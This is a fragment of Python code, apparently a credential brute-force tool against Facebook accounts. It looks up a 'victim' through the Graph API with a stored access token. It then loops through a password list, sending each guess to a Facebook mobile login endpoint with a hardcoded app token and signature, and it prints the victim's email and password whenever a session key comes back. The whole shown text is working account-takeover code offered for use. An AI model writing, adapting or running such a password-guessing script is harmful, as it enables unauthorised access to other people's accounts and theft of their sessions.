...
myid = ss_tk.read()
id_login = requests.get("https://graph.facebook.com/"+victim+"/?access_token="+myid)
log = json.loads(id_login.text)
...
for lpass in password_list:
  print("Trying...."+str(lpass))
  data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+victim+"&locale=en_US&password="+lpass+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
  if '{"session_key":' in data.text:
    print(20*"-"+"\n[ x ]"+victim+"\n[ x ]"+lpass+"\t"+"\n"+20*"-"+"\n")
    print("Successfull [ x ] "+victim+" [ x ] "+lpass+" [ x ] ")
